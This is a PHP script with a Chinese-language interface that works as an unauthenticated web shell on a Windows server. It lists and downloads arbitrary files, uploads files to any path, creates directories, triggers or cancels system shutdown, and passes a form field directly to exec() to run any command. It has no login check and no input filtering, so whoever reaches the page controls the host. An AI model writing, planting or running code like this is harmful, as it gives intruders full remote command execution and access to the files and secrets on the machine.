<?php
header("Content-type: text/html; charset=utf-8"); 
    $fp = '';
    $path = '';
	$_path = '';
    if(empty($_GET['action'])){
        if(empty($_GET['path'])){
            $_path = dirname(__FILE__);
        }else{
            if(is_dir($_GET['path'])){
                $_path = $_GET['path'];
            
            }else{
            
                $_path .=  dirname($_GET['path']);
                $file_name = $_GET['path'];
                if (!file_exists($file_name)) { //检查文件是否存在
                    echo "文件找不到";
                } else {
                    $file = fopen($file_name,"r"); // 打开文件 
                    // 输入文件标签
                    Header("Content-type: application/octet-stream");
                    Header("Accept-Ranges: bytes");
                    Header("Accept-Length: ".filesize($file_name));
                    Header("Content-Disposition: attachment; filename=" . str_replace(array(dirname($_GET['path']),'/'),'',$file_name));
                    // 输出文件内容
                    echo fread($file,filesize($file_name));
                    fclose($file);
                    exit;
                } 


            }
        }
    }else if($_GET['action'] == 'close'){
        $time = intval($_GET['time']) > 0 ? intval($_GET['time']) : $_GET['time']; 
        exec('shutdown -s -t '.$time);
        $_path = $_GET['path'];
    }else if($_GET['action'] == 'cancel'){
        exec('shutdown -a');
        $_path = $_GET['path'];
    }else if($_GET['action'] == 'mkdir'){
        $_path = $_GET['path'];
        $name =  $_GET['name'];
        $_path .=  $name;
        mkdir($_path);
    }else if($_GET['action'] == 'upload'){
        $_path = $_POST['path'];
        $name =  $_FILES['name'];

        move_uploaded_file($name['tmp_name'],$_path  . $name['name'] );
    }else if($_GET['action'] == 'ord'){
        $_path = $_GET['path'];
        $name =  $_GET['name'];
        exec($name);    
    }
	$dir = dir($_path);
?>
<table width="100%" border=1 >

<tr>
	<th colspan=3>
		<form method="get" action="" >
		目录:<input type="text" name="path" value="<?php echo $_path ?>" />
		<input type="submit" value="跳转" />
		</form>
        <input type="text" value="100" id="time">秒
        <input type="button" value="关机" onclick="location.href='?time='+document.getElementById('time').value+'&action=close&path=<?php echo $fp == '..' ? @str_replace('\\','/',@dirname($_path)) : @str_replace('\\','/',$_path.'/'.$fp); ?>'" />
        <input type="button" value="取消关机" onclick="location.href='?action=cancel&path=<?php echo $fp == '..' ? @str_replace('\\','/',@dirname($_path)) : @str_replace('\\','/',$_path.'/'.$fp); ?>'" />

		<form method="get" action="" >
		创建目录:<input type="text" name="name" value="" />
        <input type="hidden" name="path" value="<?php echo $fp == '..' ? @str_replace('\\','/',@dirname($_path)) : @str_replace('\\','/',$_path.'/'.$fp); ?>" />
        <input type="hidden" name="action" value="mkdir">
		<input type="submit" value="创建" />
		</form>

        <form method="get" action="" >
		执行命令:<input type="text" name="name" value="" />
        <input type="hidden" name="path" value="<?php echo $fp == '..' ? @str_replace('\\','/',@dirname($_path)) : @str_replace('\\','/',$_path.'/'.$fp); ?>" />
        <input type="hidden" name="action" value="ord">
		<input type="submit" value="创建" />
		</form>

        
		<form method="post" action="?action=upload" enctype="multipart/form-data" >
		文件上传:<input type="file" name="name" value="" />
        <input type="hidden" name="path" value="<?php echo $fp == '..' ? @str_replace('\\','/',@dirname($_path)) : @str_replace('\\','/',$_path.'/'.$fp); ?>" />
		<input type="submit" value="上传" />
		</form>
	</th>
</tr>
<?php
	while($fp = $dir->read()){
?>	
<tr>
	<td><a href="?path=<?php echo $fp == '..' ? @dirname($_path) : $_path.'/'.$fp; ?>"><?php echo $fp ?></a></td>
 
	<td><a href="?path=<?php echo $fp == '..' ? @dirname($_path) : $_path.'/'.$fp; ?>">下载</a></td>
</tr>
<?php
	}
?>
</table>

 